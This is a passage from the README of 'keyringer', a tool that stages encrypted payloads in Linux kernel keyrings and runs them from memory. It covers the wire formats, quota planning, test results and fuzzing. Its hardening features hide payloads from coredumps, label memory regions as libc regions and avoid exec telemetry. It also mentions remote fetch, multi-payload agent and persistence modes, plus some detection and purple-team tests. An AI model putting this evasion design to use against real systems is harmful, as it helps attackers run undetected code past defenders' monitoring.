  config evidence, and SKIPs honestly; the x86 suite remains the only lane
  that exercises `big_key` end-to-end.

AF_ALG/chacha20poly1305 are modules on the Debian kernel and the d-i
initrd ships only a crypto subset (`af_alg`, `algif_skcipher`, ...), so the
lane fetches the **matching `linux-image-<kver>-arm64` deb** (discovered
from the initrd's kernel version, `6.12.107+deb13-arm64` at the time of
writing), merges its `kernel/crypto`, `kernel/lib/crypto` and
`kernel/arch/arm64/crypto` over the initrd's module tree and regenerates
the depmod indexes — Debian debs carry no `modules.dep` (it is generated
at install time), so `depmod -b` runs on the merged tree on the host. The
overlay also ships the kernel config as `/kernel-config` for the in-VM
honesty probes. The battery itself mirrors the Alpine one (selftest,
preflight with the explicit `afalg: bind` line, deferred `stash`→`exec`
across processes, `kstdin`, encrypted roundtrip, wrong-key rejection,
`--scrub`, cross-crypto) plus the audit assertions above.

Assets and cache: `test/a64vm-debian/dl/` holds ~172 MB fetched once
(netboot `linux` ~37 MB, `initrd.gz` ~42 MB, `linux-image` deb ~93 MB —
the deb URL is derived from the initrd's kernel version, so point upgrades
of stable re-fetch automatically). Needs `qemu-system-aarch64`, `dpkg-deb`,
`depmod` (kmod), `lsinitramfs` (initramfs-tools), `cpio`, `curl`, `gzip`
and the aarch64 gcc; skips cleanly if any is missing. The Debian distro
kernel is much bigger than Alpine's `-virt`, so the lane boots with 1 GiB
and a 420 s timeout (observed wall time ~2 min under TCG).

## Execution hardening — default-on, all exec paths

No flags; applied on every execution path — ELF entry, `--raw`, `--call` —
in both the C and Python tools:

- `prctl(PR_SET_DUMPABLE, 0)` before the payload image is staged (fatal in C
  if it fails — the loader refuses to stage), so neither the loader's scratch
  buffers nor the mapped payload can be harvested from a coredump.
- `MADV_DONTDUMP` on every anonymous scratch buffer, each mapped `PT_LOAD`
  segment, the raw region and the 8 MB stack; `MADV_WIPEONFORK` on the image,
  stack and raw region so a forked child starts with a clean copy (madvise
  failures are nonfatal and logged). Note the `clone()` interplay: on
  `CLONE_VM` children the wipes never fire (shared mappings are not copied)
  — irrelevant in practice, since payload stacks are per-child allocations.
- `PR_SET_VMA` (`PR_SET_VMA_ANON_NAME`) labels the anonymous regions in
  `/proc/self/maps`: image `[anon:libc:heap]`, stack `[anon:libc:tls]`,
  scratch `[anon:libc:buf]`. Best-effort; nonfatal where the kernel lacks
  working `CONFIG_ANON_VMA_NAME` (this PVE kernel accepts the config but
  returns `EINVAL` at runtime — see the arm64 notes).
- Volatile-wipe — a memset through a `volatile` pointer so the compiler
  cannot elide the stores — of every scratch, reassembled and decrypted
  buffer before it is freed or unmapped. After the keys are revoked, the
  mapped executable image is the only live copy of the payload.

Net effect: coredump-resistant, fork-wiping, single-live-copy. Honest
caveat: `PR_SET_DUMPABLE 0` also makes the payload process itself
non-dumpable — you get no core of the payload either (usually exactly what
you want from this class of tool, but it cuts both ways for legitimate
post-exec debugging).

## Keyring quotas

The `user` key type hard-caps one payload at 32767 bytes — hence the
30000-byte chunks; `big_key` raises the chunk to 100000 bytes. Keyring
quotas apply on top, and are measured values on this box:

| Limit | Value |
|-------|-------|
| Per key (`user` type) | 32767 B hard cap |
| Per key (`big_key` type) | 100000 B wire chunks; may spill to swap-backed shmem |
| Non-root, total per UID | `maxbytes` = 20000 B; the wire (header included) plus per-key description overhead must fit — payload ceiling ≈ 19.7 KB as `user` keys |
| Non-root, keys per UID | `maxkeys` = 2000 keys (keys AND keyrings count) |
| Root, total | 25 MiB (`root_maxbytes` = 25000000) / `root_maxkeys` = 1000000 |
| Tool cap | 1000 chunks (indices `000`–`999`) per stash and per interpreter sub-sequence |

### What the kernel actually charges (measured)

Controlled `add_key` + `/proc/key-users` deltas on this kernel
(7.0.14-17-pve, 2026-10) — the charge is per key, against the owning
UID's `qnbytes` pool:

| Object | Byte charge |
|--------|-------------|
| `user` key | `strlen(desc) + payload + 5` |
| `big_key` key | `strlen(desc) + 21` **fixed** — the payload is shmem/`[file]`-backed and NOT byte-charged (a 100000-byte chunk charged 27 B as non-root) |
| keyring | `strlen(desc) + 5` |

Every key/keyring also charges 1 against `maxkeys`. A full 8768-byte
`test/hello` wire under desc `_keyringer.000` charged exactly
8787 B = 8768 + 14 + 5, which is the parse cross-check the suite pins
(section 37c).

### Live telemetry: `preflight` and `kr_quota_snapshot()`

`keyringer preflight` (and `--json`, check name `keyring-quota`; the
python twin prints the identical line) reports the LIVE per-UID pool
parsed from `/proc/key-users` (row `uid: usage nkeys/qnkeys
nikeys/maxkeys qnbytes/maxbytes` — field semantics verified empirically:
`nkeys`/`qnbytes` are the charges, the maxima denominators track the LIVE
sysctls, confirmed by flipping `maxkeys` and watching both the row and
`add_key` enforcement follow within a second):

```sh
$ ./keyringer preflight | grep keyring-quota
preflight: keyring-quota: used/max keys=18/2000, used/max bytes=1452/20000, \
remaining=~18548 bytes (live /proc/key-users measurement): INFO
```

The library entry point is `kr_quota_snapshot()` (keyringer.h): it fills
`{keys_used, keys_max, bytes_used, bytes_max, bytes_remaining}` from the
sysctls (`root_max*` under euid 0) plus this uid's row, and degrades
cleanly to used=0 when the uid has no row yet (fresh boot) — planning is
simply skipped when the limits are unreadable, leaving the mid-stash
`EDQUOT` rollback as the backstop.

### Upfront stash planning (refuse before storing anything)

`kr_stash` (and the twin's `_stash_payload`) plans BEFORE the first
`add_key`, using the measured charge model rounded UP with slack
(+16 B/key planning margin, +64 B ring margin) so a "planned OK" stash
cannot overflow by rounding — better to refuse early than `EDQUOT`
mid-stash:

- **Refusal, bytes**: the planned charge (wire bytes + per-key
  description + overhead, and the `.ldso.` wire's equivalent when
  `--selfcontained`) exceeds `bytes_remaining` → clean error, NOTHING
  stored: `stash: needs ~16540 bytes of keyring quota, ~2101 remain
  (used 17899/20000, live /proc/key-users measurement) — options:
  smaller payload; --type big_key (fewer, larger keys: 100000-byte
  chunks; this kernel charges a big_key desc+21 and does NOT byte-charge
  its payload); run as root (25 MiB); or pool across UIDs with --share`
- **Refusal, keys**: even after the big_key chunk-count relief the stash
  would exceed `maxkeys` → the same style of clean upfront failure
  (`stash: needs N keyring key(s) on top of X/Y used ...`).
- **Warning (nonfatal)**: a stash consuming >50% of the remaining bytes
  logs `stash: warning: this stash would consume ~N of M remaining quota
  bytes (>50%)` and proceeds — on the 20000-byte non-root pool a ~16 KB
  payload triggers it.
- **Auto big_key**: when the user did NOT pass `--type` and the `user`
  chunk count would not fit under `maxkeys` while the `big_key` chunk
  count would, the planner switches types automatically and says so:
  `stash: auto big_key (chunk count would exceed maxkeys)`. This is the
  maxkeys-relief mechanism only — byte relief is never claimed, because
  how a kernel charges `big_key` payloads is a per-kernel property
  (measured fixed here; planned conservatively).

The quota is per-UID **total across all keys that UID owns**: chunking cannot
exceed it, and merging keys stashed by other UIDs requires each UID's active
cooperation (`--share` sets `SETPERM`; the quota still charges the owning
UID). Exceeding the quota at `add_key` time still fails with `EDQUOT`; the
planner is the polite front door, the mid-stash rollback (revoke every
stored chunk, report the sysctls) stays as the backstop.

## Wire protocol

Three generations, all spoken by the current tools. `kr_version()` reports
`keyringer core 4.0`. Readers dispatch on the header magic (`KRH4` →
`KRH3` → `KRH1` → legacy headerless); writers pick the format with
`KR_WIRE` (`3` = v3 downgrade, `2` = v2.2 downgrade, unset = v4 the
default; an explicit `KR_WIRE=4` is an accepted no-op kept for pre-flip
scripts).

### v4 (KRH4) — per-chunk AEAD + streaming exec; the default since core 4.0

Written by default by both tools (no `KR_WIRE` needed). Every reader in
both tools opens it, exactly as they open v3/v2.2/legacy. Two defining
properties over v3:

- **Header (56 B, v3 layout)**: magic `"KRH4"`; version byte `4`; flags
  byte (bit 0 = body is per-chunk sealed); 2 reserved zero bytes;
  SHA-256 of the **full plaintext** (32 B); stash-id (8 random bytes);
  u64 LE plaintext length. A plaintext (flags=0) body is `header || raw
  plaintext`, byte-identical in shape to v3.
- **Per-chunk sealing (encrypted body)**: the plaintext is split into
  pt-chunks of `KR_V4_PT_CHUNK` = 29900 bytes and chunk `i` is sealed as
  its own envelope `nonce_i(12) || ct_i || tag_i(16)` — +28 B per piece
  — with
  `subkey_i = HKDF-SHA256(key, salt = stash-id(8) || u32le(i), info = "keyringer-v4")`
  and `AAD = header(56) || u32le(i) || u32le(total_chunks) ||
  u32le(ptlen_i)`. Every piece authenticates the whole header (version,
  digest, length, stash-id), its own index and the chunk count, so
  header tampering, reordering, truncation and cross-stash splicing all
  fail closed piece-locally. The exact wire length obeys
  `wirelen = 56 + 28*total + ptlen` with `(total-1)*29900 < ptlen <=
  total*29900` — readers solve this equation and reject anything that
  fits no chunk count ("truncated or spliced stash"). The header digest
  still covers the FULL plaintext and is verified after reassembly.
  **pt-chunk arithmetic**: a sealed piece is `ptlen + 28` wire bytes;
  29900 keeps every piece inside a 30000-byte `user` key even next to a
  56-byte header share (30000 − 64 = 29936 ≥ 29900), so a v4 stash keys
  out with at most the chunk count a v3 stash of the same payload
  would.
- **Streaming exec (C)**: an encrypted KRH4 stash is executed WITHOUT
  ever building a full plaintext buffer. `kr_load_revoke` hands the
  reassembled wire (the ciphertext — the one unavoidable stash-sized
  buffer) to `kr_exec_image`, which validates the header, decrypts chunk
  0 into a scratch bounded by `68 + min(29900, ptlen)` bytes, validates
  the ELF and maps every PT_LOAD **zeroed RW** (final protections
  deferred), then decrypts each remaining chunk into the same scratch
  and scatters its bytes into the mapped image through the PT_LOAD
  file-offset mapping, feeding a running SHA-256 (whole-stash digest
  verified before anything jumps) and wiping the scratch between
  chunks. The loader logs `v4: streamed N chunk(s), max scratch M
  bytes`; suite section 34 asserts `M < wirelen` live and that the only
  stash-sized mappings are the wire itself, the mapped PT_LOADs and the
  fixed 8 MiB payload stack. `--raw` streams into one RWX region the
  same way. **Honest limits**: the mapped image IS the plaintext once
  assembled in place — the win is that no heap/wire-sized plaintext
  copy ever exists (chunk-local scratch only) and that every piece is
  independently authenticated. The Python twin reads/writes v4
  byte-compatibly but assembles normally (it need not stream).
- **The one deliberate exception — `--call` on an ENCRYPTED v4 stash**:
  `--call` applies relocations from the section table (`e_phoff`
  headers, `SHT_RELA`, `SHT_SYMTAB`), and those bytes live in the file
  image OUTSIDE the `PT_LOAD`s — the streaming design only ever
  materializes `PT_LOAD` bytes. So this exec path takes a documented
  FULL-BUFFER decrypt: the chunks are opened into one plaintext buffer
  (chunk-by-chunk through the bounded scratch, whole-stash digest
  verified) and the unchanged `--call` pipeline then runs on it. The
  loader logs `v4: full-buffer decrypt (--call relocation path;
  streaming applies to jump exec)` (asserted by suite section 4).
  Streaming remains the path for plain exec, `--raw` and `--clone`.
- **`--selfcontained` auto-v3**: v4 ldso support is still pending (the
  exec side reassembles the `.ldso.` interpreter wire through the
  buffer path), so a `--selfcontained` stash is written as **v3** at
  stash time regardless of the default — payload and interpreter wires
  both — logging `stash: --selfcontained uses wire v3 (v4 ldso support
  pending)` (asserted by suite section 11, which also checks the stored
  chunk magic is `KRH3`). An EXPLICIT `KR_WIRE=4` + `--selfcontained`
  still refuses with the clean pre-flip error; a foreign v4 stash
  handed to `exec --selfcontained` is refused on the exec side.
  Everything else (`--clone`, `--scrub`, `--ttl`,
  `--share`/`--from`, `--keyfd`, big_key chunks, `--raw`, `--call`) is
  wire-v4-clean.

### v3 (KRH3) — opt-in downgrade (`KR_WIRE=3`)

- **v3 header (KRH3, 56 bytes)**: magic `"KRH3"`; version byte `3`; flags
  byte (bit 0 = body is a KR2 envelope); 2 reserved zero bytes;
  SHA-256 of the plaintext (32 bytes); **stash-id** (8 random bytes, the
  HKDF salt); u64 LE plaintext length.
- **KR2 envelope**: `"KR2"` magic + 12-byte nonce + ct||tag (31-byte
  overhead, same as KR1), sealed with the key **derived**:
  `subkey = HKDF-SHA256(key, salt = stash-id, info = "keyringer-v3")` —
  a leaked or reused master key no longer cross-authenticates stashes.
- **Structural AAD**: the AEAD authenticates the entire 56-byte header
  plus the envelope magic and nonce (71 bytes) — version, flags, digest,
  stash-id and plaintext length are all authenticated, so header tampering,
  truncation and cross-stash chunk splicing fail closed; the plaintext
  digest is verified after decryption exactly as in v2.2.
- **Portability**: crypto runs through the kernel's AF_ALG when available
  and otherwise falls back to userspace reference implementations
  (SHA-256 / HMAC / HKDF / ChaCha20-Poly1305) pinned by KAT vectors in the
  selftest and cross-checked against the kernel in both directions — a
  kernel without `CONFIG_CRYPTO_USER_API` still gets the full feature set.
  `KR_CRYPTO=userspace` forces the fallback (the interop matrix exercises
  it).
- **Downgrade**: v3 is selected explicitly with `KR_WIRE=3` (and is what
  `--selfcontained` stashes use automatically); `KR_WIRE=2` writes
  v2.2-format stashes; the tool reads v4, v3, v2.2 and legacy headerless
  stashes.

### v2.2 (KRH1) — still read, optionally written

The exact contract implemented by `kr_core.c` and `keyringer.py` — this is
what makes the two tools interoperable:

- **Key descriptions**: `<prefix>.%03d` starting at `000`; prefix defaults to
  `_keyringer`, overridden by `--desc PREFIX` / `KEYRINGER_DESC`. Maximum
  1000 chunks per stash (indices `000`–`999`). Interpreter chunks
  (`--selfcontained`) form a second sub-sequence `<prefix>.ldso.NNN` with
  the same numbering, stored after the payload chunks.
- **Key types**: default `user`; `--type big_key` stores `big_key` keys
  instead. Exec-side lookup is per chunk index — `user` first, then
  `big_key` — so mixed-type stashes are tolerated and exec needs no type
  flag.
- **Chunk size**: 30000 bytes of wire payload (header + body) per `user`
  key (the `user` key type caps a single payload at 32767 bytes); 100000
  bytes per `big_key` key.
- **v2 header (KRH1)**: every stash prepends a 40-byte header to the wire
  payload before chunking and before the encrypt decision:
  bytes 0..3 magic `"KRH1"`; bytes 4..7 u32 LE flags (bit 0 = body is a KR1
  envelope; all other bits are reserved and must be zero — readers reject the
  stash otherwise); bytes 8..39 SHA-256 of the **plaintext**. So an encrypted
  stash is `header || KR1-envelope(plaintext)` and a plaintext stash is
  `header || plaintext` — the digest always covers the plaintext,
  pre-encryption. Quota overhead is +40 B per stash. Interpreter stashes use
  the same header with `flags=0` and a plaintext body, always.
- **Integrity check on load**: unknown flag bits are fatal; after the
  optional decryption the plaintext is re-hashed and compared against the
  header digest. A mismatch is FATAL — a clean error naming both hex digests
  (expected vs computed), no jump, no call, no partial execution. SHA-256
  comes from the kernel AF_ALG `("hash", "sha256")` transform in C and
  `hashlib` in Python. The same check applies to the reassembled
  interpreter.
- **Legacy stashes**: a reassembled stash without the `KRH1` header (pre-v2)
  still loads exactly as before — plaintext verbatim, or decrypted when it
  starts with the `"KR1"` magic and a key is given. No digest is verified; a
  note ("no integrity digest (pre-v2 stash)") is logged.
- **Encrypted wire** (`--key` / `--keyfd` / `KEYRINGER_KEY`): the whole
  payload is encrypted **before** chunking and decrypted **after**
  reassembly. Envelope = `b"KR1"` magic (3 B) + 12 B random nonce +
  ciphertext || 16 B Poly1305 tag. ChaCha20-Poly1305 per RFC 8439 with the
  32-byte key from `--key HEX`, fd `--keyfd N` (raw 32 B or 64 hex, read to
  EOF), or env `KEYRINGER_KEY` — precedence `--key` > `--keyfd` > env;
  `--key`/env leak via `ps` and `/proc/<pid>/environ`, `--keyfd` does not.
  AAD = the first 15 bytes of the envelope (magic + nonce); overhead is 31
  bytes.
- **Lookup on exec**: `request_key(2)` on the session keyring first; if chunk
  `000` is `ENOKEY` there (or only a revoked leftover), the whole sequence is
  retried on the per-UID persistent keyring (`KEYCTL_GET_PERSISTENT` +
  `KEYCTL_SEARCH`). Whichever ring holds chunk `000` is used for the full
  sequence (first full sequence wins; no mixing). The first `ENOKEY` gap
  terminates the sequence. With `--from S1,S2,...` chunk i is read directly
  from the i-th listed serial instead (`KEYCTL_READ` probe + read, no
  `request_key`); revoke is best-effort — `EPERM`/`EACCES` on foreign keys
  is nonfatal — and the digest check still applies.
- **Sharing**: `stash --share` applies `KEYCTL_SETPERM(0x3f3f0000)`
  (possessor+user: all) to every stored serial — payload and interpreter
  chunks — and prints `share: <s1>,<s2>,...` on stdout, parseable by
  `exec --from`. Permission only: the quota keeps charging the owning UID.
- **Interpreter stashes (`--selfcontained`)**: wire = `KRH1` header
  (`flags=0`) + raw ld.so bytes, chunked under `<prefix>.ldso.NNN`, always
  plaintext (a public artifact — no signature value), digest still verified
  on load. Exec with `--selfcontained` maps the interpreter from those
  bytes; missing `.ldso.` chunks are a clean error.
- **Stash verification**: with a key, the seal is roundtrip-verified by an
  open **before** any chunk is stored; on mismatch nothing is stored.
- Executing an encrypted stash without the key is a clean error ("stash is a
  KR1 encrypted envelope; pass the same key"); a wrong key or tampered stash
  fails AEAD authentication before anything is mapped or jumped.

## Verified behavior

All of the following were run and passed on this box:

- **`make test`** (x86) — 38 sections (0–37), the lifecycle additions
  verified via strace + `/proc/keys` state + JSON schema checks + a
  cross-implementation scrub/ttl interop pass: selftest (RFC
  8439 AEAD vector, SHA-256 KAT, wire-v2 roundtrip + tamper check, VMA
  probe); `kfile`; `kstdin`; `--call kratest` (exit 42) plus the
  encrypted v4 (default wire) `--call` roundtrip through the documented
  full-buffer relocation path (exit 42, log line asserted); `--raw`
  shellcode;
  encrypted roundtrip plus wrong-key rejection; custom `--desc`; persistent
  stash with session-empty fallback plus `exec --persistent`; `khttp`
  against a local HTTP server using `keyringer-dyn`; wire-v2 integrity
  digest (stash+exec, live `keyctl pupdate` tamper rejected with no payload
  output, legacy headerless stash still loading); `--selfcontained` as root
  (stash+exec with the interpreter mapped from keyring memory — payload and
  `.ldso.` wires proven `KRH3` under the v4 default with the auto-v3 log
  line asserted — disk-path
  control run, `--key` with plaintext `.ldso.` chunks still verifying,
  missing-`.ldso.` rejection); `keygen` + `--keyfd` roundtrips (64-hex,
  raw-32-bytes, and `--keyfd` beats a wrong env key); `preflight` (10 checks,
  exit 0); `agent` running 2 frames (ELF + raw shellcode) under one PID with
  clean exit on the terminator; `--clone` propagating exit status 7;
  `keepalive` (2 beats, then `--unit` unit pair); `--type big_key`
  roundtrip (exec found the `big_key` chunk without the flag); `--share` +
  `--from` same-UID and cross-UID via `sudo`; khttp extras
  (`--header`/`--insecure` ok, `--proxy` to a dead port fails cleanly); and
  a real `EM_AARCH64` payload rejected by the x86 build with the clean arch
  error. Run twice green after the core 4.0 flip, and twice green again
  with the quota-telemetry section 37 in place.
- **`make ARCH=aarch64 test`** — the aarch64 lane passes with documented
  SKIPs: selftest and preflight run for real under `qemu-aarch64` (AF_ALG
  passes through), while the stash+exec roundtrip SKIPs on this box's qemu
  10.0.13, which returns `ENOSYS` for `add_key`/`request_key`/`keyctl`.
  `PR_SET_VMA` naming is `EINVAL` on this PVE kernel and is exercised as
  the nonfatal path.
- **`make verify-aarch64`** — the definitive arm64 check: a
  qemu-system-aarch64 VM (Alpine netboot 6.12 kernel + initramfs overlay)
  runs the full battery on a **real kernel**: `VMTEST pass=21 fail=0` —
  selftest, preflight (AF_ALG bind PASS), deferred stash→exec across
  processes, `kstdin` in-process, `--key` encrypted roundtrip, wrong-key
  rejection, `list`, and an `exec --scrub` no-residue check; `big_key`
  documents a SKIP (guest kernel lacks `CONFIG_BIG_KEYS`). Re-run green
  after the core 4.0 flip — the battery now exercises **v4-by-default**
  stashes on real arm64. First run of
  this lane caught and fixed a real arm64-only `jump_to_entry` bug
  (undeclared x30 clobber → `br` to 0); the x86 suite is unaffected.
  Also verified in the VM: the wire-v3 userspace crypto path (selftest
  KATs and a `KR_CRYPTO=userspace`-sealed stash opening under the kernel
  loader).
- **Lifecycle sections (21–26)** — `--ttl 42` proven with a strace'd
  `KEYCTL_SET_TIMEOUT(serial, 42)`; `--scrub` proven with a strace'd
  `KEYCTL_INVALIDATE` plus zero live `_keyringer.*` keys afterwards; `gc`
  sweeping as non-root (possessed keys) and as root (the live stash; the
  suite also documents the revoked-ghost-untouchable kernel behavior);
  `list --json` / `preflight --json` schema-validated; and the
  cross-implementation interop (C stash → twin `exec --scrub`, twin stash
  → C `exec --scrub`, twin `--ttl` → C exec).
- **Wire v3 + portable crypto (suite section 27 + selftest section 9)** —
  v3 plaintext/encrypted roundtrips under the explicit `KR_WIRE=3`
  downgrade (stored chunk magic checked `KRH3` live); a
  `KR_CRYPTO=userspace`-sealed stash
  opening under the AF_ALG loader and vice versa; `KR_WIRE=2` downgraded
  stashes still loading; the KR2 tag refusing a wrong key on a
  `--share`-handed-off stash; the userspace fallback pinned to the
  published vectors (FIPS SHA-256 "abc", RFC 4231 HMAC case 1, RFC 5869
  HKDF case 1, RFC 8439 §2.8.2) with AF_ALG-vs-userspace byte equality in
  both selftests.
- **Fresh-ring one-shots (section 28)** — `kfile` residue dies with the
  process (no live `_keyringer.*` keys after exit) and `--keep-ring`
  opts out; the twin behaves identically.
- **Wire-open fuzzing (section 29)** — 200,000 deterministic mutations
  (bit flips, truncations, header chaos, body splices) through the full
  v4/v3/v2.2/legacy open path, in both crypto modes, zero crashes.
- **Synthetic auditd hunt (section 30)** — `ausearch-hunt.sh` flags the
  add_key+READ+REVOKE-without-execve PID and clears a benign execve PID
  against synthetic `keyring_stash` events (no kernel audit needed).
- **`make hunt-test`** — the purple harness: fires a controlled
  `kfile` stash+exec and a `keepalive` run under the live bpftrace
  detector, then asserts both signatures are correlated on one pid
  (`add_key` ≥1, `READ` ≥2, `REVOKE` ≥1, exec mapping ≥1) and that the
  keepalive `GET_PERSISTENT`/`SEARCH` pairs appear. Passes on this box.
- **Wire v4 roundtrips (section 33)** — v4 plaintext and
  encrypted stash→exec roundtrips (the encrypted one through the
  streaming assembly, `v4: streamed N chunk(s)` asserted); a wrong key
  rejected at the chunk-0 AEAD tag; a flipped ciphertext byte and a
  flipped header digest byte in a LIVE key (`keyctl pupdate`) both
  rejected by the per-chunk tag (the AAD binds the whole header);
  `--ttl 5` stash + `exec --scrub` with zero live keys afterwards and
  the reader ignoring `KR_WIRE` (writer-only env); the `KR_WIRE=2`
  downgrade builder still roundtripping; and an EXPLICIT
  `KR_WIRE=4 + --selfcontained` refused cleanly (the implicit default
  auto-downgrades to v3 instead — section 11 proves it).
- **v4 streaming proof (section 34)** — the "no full plaintext buffer"
  property verified live: a single-chunk v4 exec logs
  `max scratch 8780 B < wire 8796 B`; then a 70000-byte (3 pt-chunk,
  70140-byte wire) root stash executes under
  `strace -f -e trace=mmap` with `N=3, max scratch 29968 B
  (= 68 + one pt-chunk) < 70140`, and the mmap trace shows **zero**
  mappings ≥ wirelen beyond the documented fixed regions — the 8 MiB
  payload stack (a loader constant) and the reassembled wire itself
  (ciphertext, the one sanctioned stash-sized buffer); every mmap in
  the `0x40000000` image window matches a page-rounded `p_memsz` of
  `test/hello`, i.e. the plaintext lives only in the mapped PT_LOADs.
- **v4 cross-interop + downgrade matrix (section 35)** — Python-v4 →
  C streaming exec, C-v4 → Python exec, plaintext v4 both directions,
  and the full `KR_WIRE ∈ {"", 2, 4}` matrix stashed by each tool and
  executed by the other (readers dispatch on magic, writers on
  `KR_WIRE`). Before the flip this same matrix was soaked five
  consecutive times under an explicit `KR_WIRE=4` (plain + encrypted ×
  C↔Python both directions + the `--call` encrypted v4 path) — 5/5 runs,
  zero failures.
- **THE FLIP (section 36)** — the suite proves the default writer is
  v4 post-core-4.0: a stash written with NO `KR_WIRE` in the environment
  has its stored chunk 0 piped out via `keyctl pipe` and the magic
  asserted to be `KRH4` (and it execs); a `KR_WIRE=3` stash's chunk is
  asserted `KRH3` (the downgrade works); and the Python twin's default
  stash is asserted `KRH4` and read back by the C tool (lockstep flip).
  The C selftest and the twin selftest carry the same flip-proof checks
  (default wrap = `KRH4`, `KR_WIRE=3`/`KR_WIRE=2` downgrades roundtrip).
- **Quota telemetry + upfront planning (section 37)** — the live
  `preflight` `keyring-quota` measurement line is cross-checked against
  `/proc/key-users` read directly in the suite (maxima equal, remaining
  within the settle window), carried in the `--json` output
  (`test/preflight_json_check.py` pins the new check name and the
  live-measurement shape), and printed byte-identically by the python
  twin; with the non-root pool nearly exhausted by filler stashes
  (stash-then-MEASURE), an over-quota stash is REFUSED UPFRONT with the
  actionable `needs ~N bytes ... options: ...` error and `/proc/keys`
  proves ZERO keys were added for the refused prefix — the twin refuses
  identically after C-stash pre-fill; a ~16 KB stash under the 20000 B
  pool fires the nonfatal >50% warning and moves the measured
  `/proc/key-users` charge by the wire bytes + the desc+5 overhead
  (parse cross-check: 16453 B charged for a 16440 B wire); and under a
  brief, always-restored `kernel.keys.maxkeys` sysctl dip (sudo), a
  40056-byte wire that would need 2 `user` chunks AUTO-SELECTS big_key
  (one `[file]`-backed 40056-byte chunk, log line asserted) while a
  maxkeys-exhausted stash fails with the same clean upfront refusal and
  zero keys stored. All filler keys are swept and the quota is asserted
  back at baseline afterwards.
- **`keyringer.py selftest`** — 9 PASS (run twice green post-flip): the
  RFC 8439 §2.8.2 AEAD vector
  through AF_ALG; a stash→load-revoke roundtrip of 7000 random bytes; a KR1
  envelope roundtrip (with AF_ALG/pure-Python interop); a KRH3 v3
  digest-header roundtrip under `KR_WIRE=3` (encrypted + plaintext, flag
  layout checked); a
  deliberate digest-corruption flip on the DEFAULT (v4) wire rejected
  fatally; a `--selfcontained` `.ldso.` wire roundtrip with BOTH wires
  proven auto-v3; a `--type big_key` stash/load roundtrip (8000
  random bytes); a `--share` + `--from` serial roundtrip with the perm
  checked as `3f3f0000`; and a wire-v4 KRH4 per-chunk AEAD roundtrip that
  PROVES the flip (default wrap asserted `KRH4`, 3-chunk encrypted +
  plaintext bodies, AAD-bound header, wrong-key +
  header-tamper + truncation refusal, `KR_WIRE=3` + `KR_WIRE=2`
  downgrades still readable).
- **`make verify-aarch64-debian`** — the second real-kernel arm64 lane
  (Debian `6.12.107+deb13-arm64` d-i netboot kernel, audit enabled):
  `VMTEST pass=29 fail=0` — the same stash+exec battery as the Alpine
  lane plus the audit-enabled boot assertions and the honest `big_key`
  SKIP documentation. Re-run green after the core 4.0 flip (v4-by-default
  on real arm64).
- **Zero-disk selfcontained exec** — as root: `/bin/true` + its ~225 KB
  ld.so (8 `.ldso.` chunks) stashed and executed with the interpreter mapped
  from keyring memory; a dynamic payload run touches disk zero times.
- **Cross-interop matrix, re-verified against v2.2** — plain and encrypted
  stashes executed in both directions, `--call kratest` stashed by the other
  tool in both directions (exit 42), `big_key` stashes executed in both
  directions, `--share` → `--from` handoffs in both directions, and a C
  `keygen` → Python `stash --keyfd` → C `exec --keyfd` chain.
- **Python twin boundaries** — the twin is x86_64-only and refuses cleanly
  on any other machine; the C-only features (`agent`, `keepalive`,
  `--clone`, khttp and its options, the aarch64 build) are refused with a
  one-line pointer to the C tool.
- **strace signature** — for a single-chunk payload, exactly one `add_key`
  followed by three `keyctl` calls (READ size probe, READ, REVOKE); no
  `execve`/`execveat`/`memfd_create` — and still none with `agent`/`--clone`
  (`clone(CLONE_VM...)` + the payload's own `exit_group` only):

  ```sh
  strace -e trace=add_key,keyctl,execve,execveat,memfd_create \
      ./keyringer kfile test/hello hello
  ```

  Multi-chunk payloads scale to one `add_key` per chunk at stash and three
  `keyctl` calls per chunk at load.

## Fuzzing the loader

Two deterministic fuzzers run inside `make test`, and the same entries plug
into vr-fuzz (ASIC-SOC) for coverage-guided campaigns:

- **`test/fuzz_wire.c` (section 29)** — 200,000 mutations through the full
  wire-open path (v3 → v2.2 → legacy) per crypto mode. `wire_open` also
  gained the v4 (`KRH4`) branches — the reader dispatches on magic, so
  the same corpus shapes (bit flips, truncations, header version/flag
  chaos, body splices) exercise the v4 header validation and per-chunk
  length-equation solver the same way (a `KRH3`→`KRH4` magic flip is
  one bit away in the mutation space; the fuzzer's header-chaos case
  hits the version/flags bytes directly). `KR_WIRE` is a writer-only
  env and does not affect this entry — it fuzzes the reader.
- **`test/fuzz_elf.c` (section 32)** — structure-aware mutations (header
  field chaos, extreme/64-bit-wrap phdr values, section-table corruption)
  against `kr_elf_fuzz_entry()`: validate, PT_INTERP discovery, PT_LOAD
  mapping, and the x86 `--call` pre-jump path (symtab + relocations).
- **Sanitizers** — both fuzzers build under ASan+UBSan; the suite runs the
  ELF fuzzer there too (section 32).

These are tuned instances of a general-purpose harness template that lives
in `../fuzzkit/` — one-file adaptation (a single `target(bytes)` function),
four engines (deterministic loop for CI, libFuzzer, AFL++ persistent,
ASan/UBSan), with the environment gotchas documented in its README.  Start
new fuzz targets from that template rather than copying these.

Round-6 findings, all fixed and pinned by the suite: nine bounds checks in
the ELF parsers used wrap-prone additive forms (`off + size > limit` wraps
on attacker u64 values — replaced with the overflow-safe `kr_oob()`
everywhere); relocation targets were validated against the image *span*,
but the gap between PT_LOAD segments is unmapped and a `p_flags=0` segment
maps PROT_NONE — `load_image` now records the exact mapped ranges with
their protections and relocation writes validate against writable recorded
ranges; and extreme phdr values could demand terabytes of address space —
`load_image` now refuses spans above `KR_MAX_IMG_SPAN` (1 GiB).

### vr-fuzz integration (ASIC-SOC)

`test/kr_fuzz_server.c` is a TCP target adapter matching vr-fuzz's
`persistent_tcp` driver: raw fuzz bytes in (one input per write, ≤1 MiB),
fixed 8-byte `KRf` status out, one forked child per connection so a hard
crash surfaces as PeerClose while the listener survives.  Routing:
`KRH3`/`KRH1`/`KR1`-prefixed inputs go to the wire-open parser, everything
else to the ELF parsers (mode = length & 3), so one corpus covers both
surfaces.  `test/vrf-seeds/` (ELF, .so, v3/v2.2 wire blobs),
`test/keyringer.dict`, `test/kr_fuzz_serve.sh` (external-supervisor
restart helper) and the target stanza
(`ASIC-SOC/config/vr_fuzz_keyringer.yaml`) complete the integration —
validated end-to-end at ~4500 execs/s on one persistent connection.
`test/vrf_smoke.py` is the in-suite smoke (section 32).

## Detection and forensics

The technique bypasses process-start telemetry (no exec event, no memfd, no
payload fd), but the keyring leaves its own traces.

- **While stashed**, the payload is visible in `/proc/keys` as
  `user <prefix>.NNN: <size>` (`big_key` likewise under its own type). Hunt
  with:

  ```sh
  ./keyringer list
